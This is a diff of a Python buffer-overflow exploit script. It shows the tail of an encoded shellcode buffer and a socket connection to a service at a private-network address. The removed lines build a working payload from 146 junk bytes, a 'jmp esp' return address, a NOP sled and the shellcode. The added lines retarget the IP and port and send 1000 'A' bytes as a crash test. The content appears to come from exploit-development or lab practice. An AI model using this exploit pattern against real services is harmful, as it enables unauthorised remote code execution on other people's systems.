@@ -29,17 +29,18 @@ buf += b"\x83\xc2\x1f\xdc\x19\x77\x8c\x49\xa2\x2e\x61\xd9\xca"
 buf += b"\xcc\x5c\x2d\x55\x2e\x8b\xaf\xa9\xf9\xf5\xc5\xc3\x39"
 
 
-ServiceIP = "10.185.10.55"
-ServicePort = 42424
+ServiceIP = "192.168.56.101"
+ServicePort = 27015
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ServiceIP, ServicePort))
 
-msg = "\x41"*146              #146 junkbyte
-msg += "\xbf\x16\x04\x08"     #jmp esp
-msg += "\x90"*16              #some NOP
-msg += buf                    #payload
-msg += "\r\n"                
+#msg = "\x41"*146              #146 junkbyte
+#msg += "\xbf\x16\x04\x08"     #jmp esp
+#msg += "\x90"*16              #some NOP
+#msg += buf                    #payload
+msg = b"\x41"*1000
+msg +=b"\r\n"                
 
 s.send(msg)
 data = s.recv(len(msg))
